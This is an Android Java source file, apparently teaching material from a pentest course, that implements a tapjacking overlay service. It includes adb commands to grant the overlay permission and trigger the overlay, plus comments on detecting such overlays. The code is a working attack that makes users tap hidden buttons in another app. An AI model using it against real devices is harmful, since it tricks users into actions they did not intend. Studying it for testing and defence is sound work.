// examples/hijacker-app/OverlayService.java
// Package: com.pentest.ch30.attacker
//
// The tapjacking overlay.
//
// ---------------------------------------------------------------------------
// WHY A SERVICE AND NOT AN ACTIVITY
// ---------------------------------------------------------------------------
// The overlay must remain on screen WHILE THE VICTIM'S ACTIVITY IS IN THE
// FOREGROUND. An Activity of ours cannot do that: the moment the victim comes
// forward, our Activity is paused and stopped, and its window is removed. A
// Service holds no window of its own but may add one directly to
// WindowManager, and that window is not tied to any activity's lifecycle.
//
// This is a general rule worth internalising: overlay attacks live in Services
// (or, historically, in toast windows and accessibility services), never in
// Activities. If you are looking for an overlay in a suspect APK, look at its
// Services and at every addView(..., WindowManager.LayoutParams) call.
//
// ---------------------------------------------------------------------------
// THE TWO FLAGS THAT MAKE IT AN ATTACK RATHER THAN A DECORATION
// ---------------------------------------------------------------------------
//   FLAG_NOT_TOUCHABLE  -- the overlay refuses touches, so every touch passes
//                          THROUGH to whatever is underneath. This is what makes
//                          it "tapjacking" rather than just "a window in the
//                          way": the user sees our text and taps the victim's
//                          button.
//   FLAG_NOT_FOCUSABLE  -- we take no input focus, so the victim's Activity
//                          continues to behave normally and the illusion holds.
//
// Note what is NOT needed: any permission on the victim, any code injection, any
// root. Only SYSTEM_ALERT_WINDOW on our side.
//
// ---------------------------------------------------------------------------
// WINDOW TYPE AND VERSION
// ---------------------------------------------------------------------------
// TYPE_APPLICATION_OVERLAY (2038) is the only overlay type available to a normal
// app from API 26 (Android 8.0) onward; TYPE_SYSTEM_ALERT / TYPE_PHONE / the
// toast trick were all closed off then, and TYPE_APPLICATION_OVERLAY is drawn
// BELOW critical system UI so it cannot cover the permission dialog itself.
// The code below picks the right constant for the running version.
//
// ---------------------------------------------------------------------------
// USAGE
// ---------------------------------------------------------------------------
//   # host -- grant the special permission (a device you own; root shown here,
//   #         the Settings toggle is the non-root route -- see labs/lab-04)
//   adb shell "su -c 'appops set com.pentest.ch30.attacker SYSTEM_ALERT_WINDOW allow'"
//
//   # host -- raise and drop the overlay
//   adb shell am startservice -n com.pentest.ch30.attacker/.OverlayService --es op show
//   adb shell am startservice -n com.pentest.ch30.attacker/.OverlayService --es op hide
//
// AUTHORISED TESTING ONLY. Remove the overlay when you are finished; a
// FLAG_NOT_TOUCHABLE window you forget about is invisible to the task switcher.

package com.pentest.ch30.attacker;

import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

public class OverlayService extends Service {

    private static final String TAG = "CH30";

    private WindowManager wm;
    private View overlay;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String op = intent == null ? "show" : intent.getStringExtra("op");
        if ("hide".equals(op)) {
            removeOverlay();
        } else {
            showOverlay();
        }
        return START_NOT_STICKY;
    }

    private void showOverlay() {
        if (overlay != null) {
            return;
        }
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);

        TextView v = new TextView(this);
        v.setText("\n\n  Tap here to CONTINUE  \n\n");
        v.setTextSize(22);
        v.setTextColor(Color.WHITE);
        // Opaque, because the point of the demonstration is that the user cannot
        // see the button they are actually pressing. A real sample would style
        // this to look like the victim app.
        v.setBackgroundColor(Color.parseColor("#1565C0"));
        v.setGravity(Gravity.CENTER);

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                type,
                // THE TWO FLAGS THAT MATTER. Without FLAG_NOT_TOUCHABLE this is
                // an ordinary window that swallows the touch; with it, the touch
                // is delivered to the window underneath and the victim's
                // MotionEvent carries FLAG_WINDOW_IS_OBSCURED.
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                android.graphics.PixelFormat.TRANSLUCENT);
        lp.gravity = Gravity.CENTER;

        try {
            wm.addView(v, lp);
            overlay = v;
            Log.i(TAG, "OVERLAY shown, type=" + type
                    + " FLAG_NOT_TOUCHABLE set -- touches will pass through");
        } catch (Exception e) {
            // The usual cause is that SYSTEM_ALERT_WINDOW has been declared but
            // not granted. It is a special permission: the manifest entry alone
            // does nothing.
            Log.i(TAG, "OVERLAY FAILED: " + e
                    + "  (is SYSTEM_ALERT_WINDOW actually granted?"
                    + " check: adb shell appops get "
                    + getPackageName() + " SYSTEM_ALERT_WINDOW)");
        }
    }

    private void removeOverlay() {
        if (overlay != null && wm != null) {
            wm.removeView(overlay);
            overlay = null;
            Log.i(TAG, "OVERLAY removed");
        }
    }

    @Override
    public void onDestroy() {
        removeOverlay();
        super.onDestroy();
    }
}
